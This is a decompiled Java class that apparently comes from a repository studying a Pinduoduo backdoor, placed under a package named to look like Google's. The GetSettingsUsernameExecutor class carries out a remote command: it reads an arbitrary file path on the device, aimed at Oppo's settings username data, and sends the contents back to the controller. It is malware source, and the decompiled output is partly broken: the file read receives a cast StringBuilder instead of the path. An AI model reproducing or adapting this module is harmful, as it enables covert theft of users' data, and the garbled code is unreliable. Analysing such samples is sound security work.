package com.google.android.sd.biz_dynamic_dex.oppo_get_settings_username;

import android.content.Context;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.biz_dynamic_dex.base.DynamicUtils;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import java.io.File;
import org.json.JSONObject;

public class GetSettingsUsernameExecutor extends DynamicCmdExecutor {
  private final int CMD = 3002;
  
  private void dispatchFail(Context paramContext, CmdData paramCmdData, String paramString) {
    try {
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(paramCmdData, "file_not_exist", null));
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  private void getUsername(Context paramContext, String paramString1, String paramString2) {
    CmdData cmdData = new CmdData(3002, paramString1, "client");
    try {
      StringBuilder stringBuilder;
      File file = new File(paramString2);
      if (!file.exists()) {
        dispatchFail(paramContext, cmdData, "file_not_exist");
        return;
      } 
      if (file.length() > 10240L) {
        stringBuilder = new StringBuilder();
        stringBuilder.append("file_length_");
        stringBuilder.append(file.length());
        dispatchFail(paramContext, cmdData, stringBuilder.toString());
        return;
      } 
      String str = DynamicUtils.readFile((String)stringBuilder, true);
      JSONObject jSONObject = new JSONObject();
      jSONObject.put("pkg", "com.android.settings");
      jSONObject.put("xml", str);
      CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(cmdData, jSONObject, null));
      return;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("exception_");
      stringBuilder.append(exception.getMessage());
      dispatchFail(paramContext, cmdData, stringBuilder.toString());
      return;
    } 
  }
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    try {
      if (TextUtils.isEmpty(paramString))
        return; 
      JSONObject jSONObject = new JSONObject(paramString);
      getUsername(paramContext, jSONObject.optString("uuid"), jSONObject.optString("file_path"));
      return;
    } catch (Exception exception) {
      return;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\4569a29c-b5a8-4dcf-a3a6-0a2f0bfdd493-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\oppo_get_settings_username\GetSettingsUsernameExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */